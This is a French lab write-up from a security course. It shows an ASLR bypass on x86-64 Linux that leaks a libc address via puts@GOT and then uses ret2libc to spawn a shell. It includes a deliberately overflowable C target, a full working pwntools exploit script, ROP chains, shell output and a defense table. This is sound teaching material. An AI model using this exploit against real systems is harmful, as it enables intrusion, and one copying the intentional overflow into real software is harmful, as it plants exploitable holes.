# Write-up — Lab 06 : ASLR Bypass — ret2plt + ret2libc

> **Embedded Security — C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![ASLR Bypass](https://img.shields.io/badge/ASLR-Bypassed-red.svg)]()
[![ret2plt](https://img.shields.io/badge/technique-ret2plt%20%2B%20ret2libc-orange.svg)]()
[![pwntools](https://img.shields.io/badge/pwntools-ROP%28%29-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** NX activé + ASLR actif — adresses libc aléatoires à chaque run  
**Technique :** 2 étapes — leak `puts@libc` via ret2plt → calculer `libc_base` → ret2libc  
**Preuve ASLR :** `libc_base` différente entre chaque exécution  
**Résultat :** Shell interactif — `id`, `whoami`, `cat /etc/passwd`

---

## 2. Environnement

```text
OS     : WSL2 Ubuntu — Linux 6.6
gcc    : -g -fno-stack-protector -no-pie
ASLR   : actif (/proc/sys/kernel/randomize_va_space = 2)
```

**checksec :**

```
Stack:  No canary found
NX:     NX enabled          ← shellcode impossible
PIE:    No PIE (0x400000)   ← adresses binaire fixes
ASLR:   actif               ← adresses libc aléatoires
```

---

## 3. Problème : ASLR rend les adresses libc imprévisibles

En Lab 05, ASLR était désactivé → libc toujours à `0x7ffff7c00000`.

Avec ASLR actif :
```
Run 1 : puts @ 0x76095d487be0  → libc base : 0x76095d400000
Run 2 : puts @ 0x72a8b6c87be0  → libc base : 0x72a8b6c00000
```

Les adresses de `system()` et `/bin/sh` changent à chaque exécution — impossible de les hardcoder. Il faut les **leaker depuis le programme en cours d'exécution**.

---

## 4. Code vulnérable — `target.c`

```c
#include <stdio.h>
#include <unistd.h>

// Gadget pop rdi ; ret inclus explicitement
__asm__(".global pop_rdi\npop_rdi:\n\tpop %rdi\n\tret\n");

void vulnerable() {
    char buffer[64];
    puts("Input :");
    fflush(stdout);        // indispensable en mode pipe
    read(0, buffer, 200);  // overflow volontaire
}

int main() {
    vulnerable();
    return 0;
}
```

**Pourquoi `pop rdi; ret` en inline asm ?**  
Le binaire est trop petit pour contenir ce gadget naturellement. En production, on le cherche dans la libc — mais on ne connaît pas la base libc avant le leak.

---

## 5. Stratégie en 2 étapes

```
┌─────────────────────────────────────────────────────────┐
│  ETAPE 1 — Leak                                         │
│                                                         │
│  pop rdi → puts@GOT → puts@PLT → vulnerable()          │
│                │                                        │
│                └─ puts affiche l'adresse réelle de puts │
│                   dans libc → on la lit                 │
└─────────────────────────────────────────────────────────┘
              │
              ▼  leaked_puts - offset_puts = libc_base
┌─────────────────────────────────────────────────────────┐
│  ETAPE 2 — Exploit                                      │
│                                                         │
│  pop rdi → /bin/sh → system()                          │
│  (adresses calculées depuis libc_base)                  │
└─────────────────────────────────────────────────────────┘
```

**Clé :** `puts@GOT` contient l'adresse **réelle** de `puts` en libc (résolue par le linker dynamique). En l'affichant avec `puts(puts@GOT)`, on leak l'adresse absolue de puts dans la libc de ce run.

---

## 6. Exploit — `exploit.py`

```python
from pwn import *

elf  = ELF('./target')
libc = elf.libc
context.binary = elf

p = process('./target')

# ── ETAPE 1 — Leak ──
rop1 = ROP(elf)
ret_addr = rop1.find_gadget(['ret'])[0]
rop1.call(elf.plt['puts'], [elf.got['puts']])  # puts(puts@GOT)
rop1.raw(ret_addr)                              # alignement stack
rop1.call(elf.sym['vulnerable'])                # retour a vulnerable

OFFSET = 72
payload1 = b'A' * OFFSET + rop1.chain()

p.recvuntil(b'Input :\n')
p.send(payload1)

# Lire l'adresse leakee (6 octets + \n de puts)
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"puts @ {hex(leaked_puts)}")

# ── CALCUL libc base ──
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"libc base : {hex(libc.address)}")

# ── ETAPE 2 — ROP final ──
rop2   = ROP([elf, libc])
binsh  = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
rop2.call(system, [binsh])

payload2 = b'A' * OFFSET + rop2.chain()

p.recvuntil(b'Input :\n')
p.send(payload2)
p.interactive()
```

---

## 7. Chaînes ROP

**Stage 1 :**
```
0x0000:  0x401176  pop rdi; ret
0x0008:  0x404000  got.puts          ← adresse fixe (no PIE)
0x0010:  0x401064  puts@PLT          ← affiche got.puts → leak libc
0x0018:  0x40101a  ret               ← alignement
0x0020:  0x401178  vulnerable()      ← 2e input
```

**Stage 2 (adresses variables selon le run) :**
```
0x0000:  0x401176          pop rdi; ret
0x0008:  0x7f...cb42f      /bin/sh    ← libc_base + offset
0x0010:  0x7f...58750      system()   ← libc_base + offset
```

---

## 8. Résultat

```
[+] puts @ 0x76095d487be0
[+] libc base : 0x76095d400000
[+] Shell obtenu
$ id
uid=1000(angevirus) groups=1000(angevirus),4(adm),27(sudo),989(ollama),1001(docker)
$ cat /etc/passwd  → lecture système de fichiers
```

> Screenshot : [docs/lab06_aslr_bypass.png](docs/lab06_aslr_bypass.png)

---

## 9. Progression des protections

| Lab | Technique | NX | Canary | PIE | ASLR |
| --- | --- | --- | --- | --- | --- |
| 02 | ret2win manuel | Off | Off | Off | Off |
| 03 | ret2win pwntools | Off | Off | Off | Off |
| 04 | Format String | On | Off | Off | Off |
| 05 | ROP ret2libc | On | Off | Off | Off |
| **06** | **ret2plt + ret2libc** | **On** | **Off** | **Off** | **On** |

---

## 10. Défense

| Vecteur | Mesure |
| --- | --- |
| ASLR bypass via leak | **Full RELRO** — la GOT devient read-only après init (empêche les writes, pas les reads) |
| Leak via puts@GOT | Désactiver les fonctions d'affichage inutiles ou ne pas exposer de sortie vers l'attaquant |
| ROP ret2libc | Activer **PIE** — randomise aussi les adresses du binaire (gadgets et PLT) |
| Overflow | `read(0, buf, sizeof(buf))` — limiter la taille |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Vulnérabilité | Stack buffer overflow — offset 72 |
| Protection contournée | ASLR (adresses libc aléatoires) |
| Technique de leak | ret2plt — `puts(puts@GOT)` via ROP |
| Calcul base libc | `leaked_puts - libc.symbols['puts']` |
| Résultat | Shell interactif — 2 runs, 2 bases libc différentes |

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
